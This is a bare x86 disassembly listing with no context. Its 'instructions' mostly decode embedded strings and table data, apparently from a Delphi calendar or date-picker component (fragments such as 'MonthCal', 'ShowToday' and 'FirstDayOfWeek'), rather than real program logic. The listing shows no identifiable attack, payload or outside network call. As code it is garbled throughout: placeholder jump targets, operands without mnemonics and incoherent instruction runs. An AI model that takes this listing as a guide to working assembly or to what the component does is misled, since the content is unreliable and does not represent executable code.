inc eax
add [ ecx + edi ] bl
and [ edi ] eax
pop es
andps xmm0 [ ebx + 0x6f ]
insd
insd
outsd
outsb
inc ebx
popad
insb
outsb
popad
jb r-xdata
push ebx
outsb
jb r-xdata
add ecx [ eax ]
push es
inc esp
add [ edx + ebp * 2 + 0x3e3c0041 ] al
aam 0x25
dec eax
add [ edi + ecx * 4 + 0x58600044 ] bl
imul ebp [ esi + 0x61 ] 0x4d0d016c
or [ edi + ebp * 2 + 0x77 ] esp
push ebx
outsd
ja r-xdata
outsd
outsb
je r-xdata
add [ 0x746e6f4d ] al
push 0x72614308
push esp
dec edi
bound ebp [ edx + 0x65 ]
or [ edi + ebp * 2 + 0x77 ] esp
inc esi
outsd
ja r-xdata
popad
je r-xdata
push di
imul eax [ gs : ecx ] 0x0
add [ eax ] al
add [ edi ] al
je r-xdata
popad
jns r-xdata
add [ eax ] al
add [ eax + 0x1f ] al
inc edi
add [ ecx ] cl
outsd
ja r-xdata
add [ eax ] al
pop es
clc
inc ecx
add [ eax + eax ] bl
add bh bh
and al 0x48
add [ ecx ] al
add [ eax ] al
add [ 0x13000000 ] al
add [ eax ] al
add [ 0x72541100 ] 0x61
add [ ebp + eax * 2 + 0x44 ] bl
add [ ebx + ebx + 0x44 ] cl
add [ ecx + ebp * 8 ] ch
inc ecx
add [ esi ] dl
inc ecx
inc ebx
popad
insb
inc ebp
jb r-xdata
push 0x456c6143
and [ edi ] al
push eax
fild [ ebx ]
or eax [ eax ]
or [ ebx + 0x6f ] al
inc esp
add [ edx + edx ] dh
inc esp
add [ ebp + eax * 2 + 0x44 ] bl
add [ esi + edi ] bh
inc edx
outsd
insb
dec ecx
outsb
outsw
or [ ebx + 0x61 ] al
inc ecx
add [ ecx + edi ] dl
inc eax
add [ eax - 0x1e ] ch
inc ecx
add [ ecx + edi ] bl
inc eax
add [ eax + 0x58004460 ] bl
inc eax
add [ esi + esi + 0x40 ] dh
outsb
popad
insb
push 0x4720
popad
jns r-xdata
arpl [ eax + eax + 0x5 ] si
dec ebp
outsd
outsb
je r-xdata
push 0x65
add ah dl
and eax 0x8f9c0048
inc esp
add [ eax + 0x58 ] ah
or [ ebx + 0x61 ] al
outsw
inc ebp
jbe r-xdata
push 0x64737275
popad
jns r-xdata
jb r-xdata
popad
jb r-xdata
dec esp
outsd
outsb
popad
jns r-xdata
add al [ eax ]
add [ eax + 0x140043db ] ch
jmp 0x395b208f
or esp [ edi + ebp * 2 + 0x77 ]
push esp
outsd
add eax [ eax ]
inc ebx
popad
insb
outsb
popad
jb r-xdata
add [ esi ] cl
inc ecx
add [ ecx + ebp * 8 ] dh
inc ecx
add [ edi + ebp - 0x754fffb8 ] bl
inc esp
add [ eax + 0x2c004832 ] dl
xor [ eax ] ecx
test al 0x10
inc esp
add [ eax * 4 - 0x7ab3ffbc ] ch
inc esp
add [ edx + eax * 4 + 0xff00044 ] ah
inc esp
add ah dh
cmove eax [ eax ]
or al 0x40
inc esp
add [ eax ] bh
inc eax
inc esp
add [ ebx + ebx ] dh
inc esp
add [ ecx + edx + 0x44 ] ch
add al al
sbb al 0x44
add [ eax ] bh
sbb al 0x44
add [ edi + ebx + 0x44 ] cl
add al bh
sbb eax 0x5f340044
inc esp
add [ eax + eax * 2 - 0x7d07ffbc ] bh
inc esp
add [ ebx + eax * 4 + 0x44 ] dh
add [ eax + 0x5800447e ] dh
add [ eax + eax - 0x2c ] 0x45
outsd
jb r-xdata
xor [ ebx ] ah
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx ] cl
insb
jae r-xdata
add [ ebx + ebx + 0x44 ] cl
add [ ecx + ebp * 8 ] ch
inc ecx
add [ esi ] dl
inc ecx
add [ esi ] cl
inc ecx
add [ ecx + ebp * 8 ] dh
inc ecx
add [ eax ] bh
and eax 0x8ab00048
inc esp
add ah cl
pop [ eax + eax + 0x18 ]
pop [ eax + eax - 0x58 ]
adc [ eax + eax + 0x2c ] al
test [ eax + eax + 0x4c ] eax
test [ eax + eax - 0x5c ] eax
add [ eax + eax - 0x10 ] 0xf
inc esp
add ah dh
cmove eax [ eax ]
or al 0x40
inc esp
add [ eax ] bh
inc eax
inc esp
add [ ebx + ebx ] dh
inc esp
add [ ecx + edx + 0x44 ] ch
add al al
sbb al 0x44
add [ eax ] bh
sbb al 0x44
add [ edi + ebx + 0x44 ] cl
add al bh
sbb eax 0x5f340044
inc esp
add [ eax + eax * 2 - 0x7d07ffbc ] bh
inc esp
add [ ebx + eax * 4 + 0x44 ] dh
add [ eax + 0x5800447e ] dh
add [ eax + eax - 0x2c ] 0x45
inc esp
add [ esp + ecx * 2 + 0x44 ] dl
add al al
pop ecx
inc esp
add al ah
push ebx
inc esp
add [ esi + edx * 2 + 0x271c0044 ] ah
dec eax
add [ eax + 0x5a ] bl
inc esp
add [ edx + ebx * 2 + 0x44 ] bl
add [ ecx + ebx * 2 ] dl
inc esp
add [ eax + ebx * 2 - 0x7b67ffbc ] bh
inc esp
add [ ebx ] al
inc esp
add [ ecx + eax * 4 + 0x44 ] dl
add [ esp + eax * 4 ] al
inc esp
add [ esi ] al
dec eax
add [ eax ] cl
dec eax
add al ch
sub al [ eax ]
mov eax 0xe8004827
sub al [ eax ]
call 0xffffffffe847616f
sub al [ eax ]
andps xmm0 [ ebx + 0x6f ]
insd
insd
outsd
outsb
inc ebx
popad
insb
outsb
popad
jb r-xdata
pop esp
inc ebp
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + 0x47 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x21 ] cl
inc edi
add [ eax + 0x2 ] dl
add [ eax ] al
test al 0xdb
inc ebx
add [ ecx + ebp * 8 ] dl
imul ebp [ esi + 0x61 ] 0x4720686c
add [ eax ] al
or [ ebx + 0x6f ] al
outsd
ja r-xdata
or esp [ edi + ebp * 2 + 0x77 ]
push ebx
ja r-xdata
outsd
dec ebp
popad
jns r-xdata
add [ eax ] al
pop esp
and [ edi ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
ja r-xdata
or al 0x64
outsd
outsd
ja r-xdata
inc edi
je r-xdata
jae r-xdata
outsb
[ eax + 0x28 ]
dec eax
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43090010 ] al
popad
insb
inc ebx
outsd
insb
outsd
add [ eax ] dl
inc eax
add [ eax + eax ] bl
[ eax + eax ]
inc esp
add [ esp + ecx * 2 + 0x44 ] dl
add al al
pop ecx
inc esp
add [ ecx + esi + 0x56a40048 ] dl
inc esp
add [ edi ] bl
dec eax
add [ eax + 0x5a ] bl
inc esp
add [ edx + ebx * 2 + 0x44 ] bl
add [ ecx + ebx * 2 ] dl
inc esp
add [ eax + ebx * 2 - 0x7b67ffbc ] bh
inc esp
add [ ebx ] al
inc esp
add [ ecx + eax * 4 + 0x44 ] dl
add [ esp + eax * 4 ] al
inc esp
add [ esi ] al
dec eax
add [ eax ] cl
dec eax
add al ah
xor [ eax ] ecx
mov eax 0xe8004827
xor [ eax ] ecx
sbb al 0x32
dec eax
add [ eax + 0x32 ] bl
dec eax
add [ edx ] al
add [ esi ] cl
mov al 0x4e
mov esp sub_482ff4
sbb al 0x30
dec eax
add [ esi ] cl
push esp
dec ebp
outsd
outsb
je r-xdata
add ah dl
inc ebp
inc eax
add [ eax ] dh
and eax [ edi ]
pop es
push cs
push esp
dec ebp
outsd
outsb
je r-xdata
insd
inc ebx
je r-xdata
add [ eax - 0x21 ] dl
inc ebx
add [ ebx ] cl
add [ eax ] cl
inc ebx
outsd
inc edi
add [ edx ] bl
and eax [ edi ]
push eax
add al [ eax ]
add [ eax ] bl
inc edi
add [ ecx + ebp * 8 ] dl
inc ecx
add [ ecx + edi ] dl
inc eax
add [ eax - 0x1e ] ch
inc ecx
add [ ecx + edi ] bl
inc eax
add [ eax + 0x58004460 ] bl
inc eax
add [ esi + esi + 0x40 ] dh
add ah dl
and eax 0x8f9c0048
inc esp
add [ eax + 0x58 ] ah
inc esp
add [ edx + ebp * 2 + 0x3e3c0041 ] al
inc esp
add [ edx + edx ] dh
inc esp
sub al 0x22
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dh
and eax [ edi ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al 0x23
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
add [ esi + esi + 0x40 ] dh
add [ eax + 0xe004036 ] dh
inc ebp
dec ebp
outsd
outsb
je r-xdata
add [ ebx + 0x4721d0c0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dl
and [ edi ] eax
or al 0x0
add [ eax ] al
pop eax
sbb eax 0x39080047
inc eax
add [ ecx + edi ] dl
inc eax
add [ eax ] bl
cmp [ eax ] eax
sbb al 0x39
add [ eax ] al
add [ eax ] al
dec eax
and [ edi ] eax
push eax
insb
jae r-xdata
imul ebp [ fs : esi + 0x61 ] 0x4d0d016c
outsd
arpl [ ecx + 0x6c ] sp
inc esp
popa
jne r-xdata
adc [ edi + ebp * 2 + 0x77 ] ah
outsd
ja r-xdata
int3
insd
inc ebx
outsd
inc ebx
je r-xdata
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsd
jpe r-xdata
mov esp 0x740043cd
add [ eax ] al
call [ edx + eax * 2 + 0x44 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jb r-xdata
push ebx
imul edi [ edx + 0x65 ] r-xdata
insb
add [ eax ] eax
jmp [ ebp + eax * 4 + 0x10044 ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax 0x75410800
je r-xdata
add [ eax ] al
inc ebx
popad
insb
outsb
popad
jb r-xdata
pop ds
inc edi
add [ eax ] cl
adc al 0x54
dec edi
outsb
inc ebx
popad
jne r-xdata
outsb
jae r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
fwait
add [ eax ] al
[ ebx + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc eax 0x72440800
popad
dec ebx
jb r-xdata
add [ eax ] al
or al 0x0
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
or eax [ eax ]
add eax 0x67696c41
outsb
adc al 0xcd
inc ebx
add [ ecx ] ah
add bh bh
mov eax 0x54004410
adc [ eax + eax ] eax
and al [ edi ]
pop eax
and [ edi ] eax
cmp al [ eax ]
or [ ebx + 0x6f ] al
insd
inc ebx
je r-xdata
[ ecx + ebp + 0x27fc0048 ]
jae r-xdata
adc al 0x0
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
imul ebp [ esi + 0x74 ] 0x40100073
add [ edx + eax ] al
inc [ eax ]
sub eax 0x10048
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc al [ eax ]
or ecx [ ebp + 0x75 ]
insb
je r-xdata
test [ eax + eax + 0x1 ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push cs
add [ ebx ] cl
inc edx
outsd
jb r-xdata
insb
jae r-xdata
add bh bh
lodsb [ esi ]
sub [ eax ] ecx
cld
daa
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x45070018 ] al
outsb
inc esp
jb r-xdata
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
dec ebx
push ebx
insb
arpl [ gs : esp + esi * 4 - 0x34 ] si
inc ebx
add [ eax + ebp ] bh
dec eax
add [ eax + ebp + 0x48 ] ch
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x44040013 ] al
popad
je r-xdata
add [ eax + 0x430b0011 ] al
outsd
jb r-xdata
add [ eax ] al
add [ ebx ] 0x0
inc esp
add [ eax ] al
add [ eax - 0x3a ] ch
inc ebx
add [ ebx ] bl
add bh bh
js r-xdata
dec ebp
outsd
inc esp
fiadd [ ebx ]
mov [ ecx ] al
add bh bh
mov [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sbb al 0x0
pop es
dec ecx
insd
dec esi
popad
insd
mov ah 0xcc
inc ebx
add [ eax ] ch
add al [ eax ]
[ edx + ebp + 0x28040048 ]
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4d07001d ] al
popad
js r-xdata
inc eax
pop ds
inc edi
add [ eax ] ah
add al [ eax ]
push [ edx + ebp ]
dec eax
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi ] 0x0
add [ eax ] al
sbb [ eax ] eax
push cs
inc esi
imul esi [ edx + 0x73 ] 0x79614474
dec edi
push di
imul esp esp 0xfffffffc
inc ecx
add [ eax ] ch
add bh bh
pop eax
push ds
inc esp
add [ eax + 0x1e ] ch
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4604001a ] al
outsd
outsb
je r-xdata
add [ ecx ] 0x0
add [ eax ] al
pop ss
add [ edi ] al
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
mov ah 0xcc
inc ebx
add [ eax ] bl
add al [ eax ]
int3
popad
dec ebp
outsd
add [ gs : eax ] dl
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
push eax
mov [ ebx ] 0x7a
add [ eax ] al
outsb
jae r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc [ eax ] eax
or eax [ ebx + 0x6f ]
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
pop edi
add [ eax ] al
push [ eax ]
add dh bh
mov [ esi ] bl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4208000f ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0x2465646f
push ds
inc edi
add [ eax ] cl
add al [ eax ]
insb
imul esp [ edi + 0x6e ] r-xdata
popad
add [ eax ] al
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
pop ds
add [ edi ] al
dec ebp
imul ebp [ esi + 0x44 ] 0x657461
adc [ eax ] al
pushad
add [ eax ] al
[ eax + eax ]
popad
je r-xdata
popad
je r-xdata
fld [ ebx ]
test [ ecx ] al
add bh bh
test [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x3 ] al
sbb eax [ eax ]
pop es
dec ecx
insd
push cs
push eax
popad
jb r-xdata
push esp
adc [ eax ] al
xor [ edx ] al
add bh bh
mov [ ebx ] ch
dec eax
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb [ edi ] 0x0
add [ eax ] al
push ds
add [ esi ] cl
dec ebp
popad
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x50090023 ] al
outsd
outsb
je r-xdata
add [ gs : eax ] dl
inc eax
add [ ecx ] bl
add bh bh
nop
push ds
inc esp
add [ ecx ] al
insb
arpl [ gs : edx + edx * 2 + 0x61 ] si
outsb
mov ah 0xcc
inc ebx
add [ eax ] bh
add al [ eax ]
mov esp cs
jo r-xdata
add [ eax ] al
and al [ eax ]
push cs
push eax
popad
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and [ eax ] eax
or dl [ eax + 0x61 ]
jb r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ eax ] al
pop ecx
add [ eax ] al
call [ eax + 0x100441e ]
add [ eax - 0x80000000 ] al
and al 0x0
or [ ebx + 0x68 ] dl
outsd
ja r-xdata
outsb
je r-xdata
add [ esi + 0x2 ] al
add bh bh
push eax
das
outsb
jne r-xdata
add [ eax ] eax
outsb
popad
jns r-xdata
add [ eax ] al
and eax 0x68530900
outsd
ja r-xdata
imul ebp [ esi + 0x74 ] r-xdata
jo r-xdata
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
inc ebx
add [ eax ] ah
xchg [ eax + eax - 0x60 ] al
xchg [ eax + eax + 0x1 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
imul esi [ edx + 0x63 ] 0xcc8c656c
adc [ eax ] al
cdq
add [ eax ] al
push [ esi + ebx + 0x1e7c0044 ]
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53080024 ] al
push 0x6948776f
outsb
je r-xdata
add [ ecx + eax - 0x79470100 ] ah
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sub [ eax ] al
pop es
outsd
popad
jns r-xdata
add al [ eax ]
push [ eax ]
das
dec eax
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
push 0x6948776f
outsb
je r-xdata
adc [ eax ] al
0xd8ff0000 0x441e
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
adc [ eax ] al
push edi
add [ eax ] al
inc [ esp + ebx + 0x3dfc0044 ]
inc esp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sub [ eax ] eax
pop es
push esi
imul esi [ ebx + 0x69 ] 0x656c62
adc [ eax ] al
inc edi
add al [ eax ]
push [ eax + 0x2f ]
dec eax
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sub al [ eax ]
or edx [ edi + 0x65 ]
imul ecx [ gs : esi + 0x75 ] 0x6d
bound esp [ ebp + 0x72 ]
jae r-xdata
inc ebp
adc [ eax ] al
dec eax
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ es : edi ] cl
push ebx
push 0x6f54776f
adc [ eax ] al
inc esi
add al [ eax ]
call [ eax + 0x2f ]
je r-xdata
outsb
push cs
inc ebp
add [ eax + eax ] bh
[ ebx + 0x10044 ]
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and eax [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub eax 0x6e4f0a00
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
call 0xffffffffe946284c
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a002e ] al
outsb
inc esp
jb r-xdata
xor al 0x41
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
add [ eax ] 0x0
add [ eax + 0x4f090031 ] al
outsb
inc esp
jb r-xdata
inc edi
je r-xdata
push esp
xor al 0x41
add al al
add [ eax ] eax
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jo r-xdata
jb r-xdata
outsd
outsb
je r-xdata
or [ edi + 0x6e ] ecx
jb r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
sub al 0x0
push cs
dec edi
outsb
inc ebx
outsd
outsb
je r-xdata
iretd
dec edi
outsb
jae r-xdata
dec edi
dec ecx
outsb
outsw
sub al 0xcf
inc ebx
add al bl
add [ eax ] eax
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
dec ebx
jns r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090035 ] al
outsb
xor al 0x41
add al cl
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060033 ] al
outsb
inc ebp
js r-xdata
add [ eax ] al
js r-xdata
nop
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + ebp + 0x47 ] al
sub al 0xcf
inc ebx
add al ch
add [ eax ] eax
add [ eax ] al
pop eax
sbb eax 0x39080047
inc eax
add [ ecx + edi ] dl
inc eax
add [ eax ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
sub al [ edi ]
or al 0x0
jo r-xdata
push ebx
je r-xdata
rol [ ebx ] 0x1
insb
iretd
dec edi
outsb
dec ebx
jns r-xdata
je r-xdata
add [ eax + 0x4f070032 ] al
add [ eax ] al
dec edi
jbe r-xdata
inc ebp
outsb
inc esp
jb r-xdata
cwde
push eax
outsd
jo r-xdata
add [ ecx ] al
add [ eax ] al
add ah cl
sub al [ edi ]
pop es
inc esp
popad
je r-xdata
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
push esp
sub al [ edi ]
pop es
inc esp
jb r-xdata
insd
inc ebx
outsd
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
push esp
imul ebp [ ebp + 0x65 ] 0x6f727245
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0038 ] al
outsb
push ebx
je r-xdata
rol [ ebx ] cl
add [ ecx ] al
add bh bh
add [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp [ eax ] al
or ecx [ edi + 0x6e ]
adc [ ecx ] al
add bh bh
adc [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
outsb
inc ebp
outsb
je r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor al [ eax ]
pop es
dec edi
pop ds
inc edi
add [ eax + 0x2 ] cl
add bh bh
dec eax
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0034 ] al
outsb
jb r-xdata
inc ebp
outsb
inc esp
outsd
arpl [ ebx - 0x68 ] bp
rol [ ebx ] 0x1
sbb [ ecx ] al
add bh bh
sbb [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] eax
or [ edi + 0x6e ] ecx
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090030 ] al
outsb
jo r-xdata
outsb
push es
push ebx
je r-xdata
insb
add [ eax ] al
pop es
je r-xdata
add ecx [ 0x74614454 ]
push esp
inc esp
sub al [ edi ]
add [ eax ] al
add [ eax ] al
or [ ebx + 0x6f ] al
insd
push ebp
jo r-xdata
add [ eax - 0x80000000 ] al
cmp [ eax ] eax
or ecx [ edi + 0x6e ]
pop eax
sub al [ edi ]
cmp [ eax ] eax
sbb al 0x39
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
add [ esi + esi + 0x40 ] dh
add [ eax + 0xe004036 ] dh
jb r-xdata
sub [ ecx ] al
rol [ ebx ] 0x1
or [ ecx ] al
add bh bh
or [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] al
or [ edi + 0x6e ] ecx
add [ eax + 0x4f0a002f ] al
outsb
inc esp
jb r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
xor al 0x41
add [ eax ] ch
add [ eax ] eax
[ eax ]
pop eax
imul ebp [ esi + 0x67 ] 0x61440b01
je r-xdata
inc ebx
popad
insb
inc ecx
insb
imul esp [ edi + 0x6e ] 0x746e656d
add [ eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ebx + ebp ] al
inc edi
add [ edi ] al
je r-xdata
sub eax [ edi ]
add ecx [ edi ]
push esp
inc esp
push esp
push bx
push 0x674726f
dec sp
outsd
outsb
or [ bp + di + 0x6f ] al
add [ edi ] al
push esp
imul ebp [ ebp + 0x65 ] 0x6d6f4308
inc ebx
je r-xdata
inc ebx
je r-xdata
insb
jae r-xdata
jae r-xdata
outsd
ja r-xdata
inc ebp
inc esp
popad
je r-xdata
inc eax
add [ esi ] cl
inc esp
outsd
arpl [ ebx + 0x58 ] bp
add [ eax ] al
add [ eax ] al
or [ edi ] 0x0
add [ eax ] al
push esp
imul ebp [ ebp + 0x65 ] 0x6b636950
jb r-xdata
add [ esi + esi + 0x40 ] dh
add ah dl
cwde
pushad
inc esp
add [ eax + 0x36 ] bl
inc eax
inc ecx
outsb
je r-xdata
push esp
inc esp
popad
dec esp
je r-xdata
insd
inc ebx
je r-xdata
outsd
insb
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
fsubr [ edi + eax * 2 ]
insb
jae r-xdata
popad
je r-xdata
shr [ edx ] 0x1
inc edi
add [ ebx ] al
or eax 0x44544454
popad
je r-xdata
je r-xdata
add [ eax ] al
add [ edi ] cl
add [ ecx ] cl
insb
inc ebp
jae r-xdata
pop eax
and [ edi ] eax
inc ebx
add [ eax ] cl
inc ebx
outsd
sub eax 0xf070047
push esp
inc esp
popad
je r-xdata
and eax 0x8f9c0048
inc esp
add [ eax + 0x58 ] ah
inc esp
add [ edx + ebp * 2 + 0x3e3c0041 ] al
inc esp
add [ edx + edx ] dh
inc esp
add [ ebp + eax * 2 + 0x44 ] bl
add [ ebx + ebx + 0x44 ] cl
add [ ecx + ebp * 8 ] ch
inc ecx
add [ esi ] dl
inc ecx
add [ esi ] cl
inc ecx
add [ ecx + ebp * 8 ] dh
inc ecx
add al ah
xor cl [ eax ]
mov al 0x8a
inc esp
add ah cl
pop [ eax + eax + 0x18 ]
pop [ eax + eax - 0x58 ]
adc [ eax + eax + 0x2c ] al
test [ eax + eax + 0x4c ] eax
test [ eax + eax - 0x5c ] eax
add [ eax + eax - 0x10 ] 0xf
inc esp
add ah dh
cmove eax [ eax ]
or al 0x40
inc esp
add [ eax ] bh
inc eax
inc esp
add [ ebx + ebx ] dh
inc esp
add [ ecx + edx + 0x44 ] ch
add al al
sbb al 0x44
add [ eax ] bh
sbb al 0x44
add [ edi + ebx + 0x44 ] cl
add al bh
sbb eax 0x5f340044
inc esp
add [ eax + eax * 2 - 0x7d07ffbc ] bh
inc esp
add [ ebx + eax * 4 + 0x44 ] dh
add [ eax + 0x5800447e ] dh
add [ eax + eax - 0x2c ] 0x45
inc esp
add [ esp + ecx * 2 + 0x44 ] dl
add al al
pop ecx
inc esp
add [ esp + esi + 0x48 ] bl
add [ esi + edx * 2 + 0x35280044 ] ah
dec eax
add [ eax + 0x5a ] bl
inc esp
add [ edx + ebx * 2 + 0x44 ] bl
add [ ecx + ebx * 2 ] dl
inc esp
add [ eax + ebx * 2 - 0x7b67ffbc ] bh
inc esp
add [ ebx ] al
inc esp
add [ ecx + eax * 4 + 0x44 ] dl
add [ esp + eax * 4 ] al
inc esp
add [ esp + esi ] ch
dec eax
add [ eax ] cl
dec eax
add ah dl
aaa
dec eax
add [ eax + 0x4004827 ] bh
cmp [ eax ] cl
cmp [ eax ] bh
dec eax
add ah ah
cmp [ eax ] cl
push cs
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x2900040 ] ch
add [ eax ] al
add al 0x0
or eax 0x4eb00eb0
mov esp 0x3570ffb3
dec eax
add [ eax - 0x4bffb7cb ] dl
xor eax 0x35080048
dec eax
add [ edi ] cl
push esp
inc esp
popad
je r-xdata
push esp
imul ebp [ ebp + 0x65 ] 0x6c410b01
or [ ebx + 0x6f ] al
je r-xdata
add [ eax + eax ] cl
inc eax
add [ edx + ebp + 0xb030047 ] dl
push esp
inc esp
push esp
inc esp
popad
je r-xdata
push esp
imul ebp [ ebp + 0x65 ] 0x61445409
sub eax [ edi ]
or [ edx ] dl
push esp
inc esp
push esp
push eax
insd
inc ebx
je r-xdata
outsd
imul ebp [ ebp + 0x65 ] 0x646e694b
add [ eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ edx + ebp + 0x47 ] dl
add [ edi ] al
push esp
inc esi
outsd
jb r-xdata
insb
add [ gs : ebx ] ecx
inc ecx
insb
insd
push edx
imul esp [ edi + 0x68 ] 0x6f430874
adc al [ eax ]
or al 0x43
insb
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
push 0x2cff0001
xchg edx eax
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax + 0x1 ] ch
add bh bh
sub al 0x92
fiadd [ ebx ]
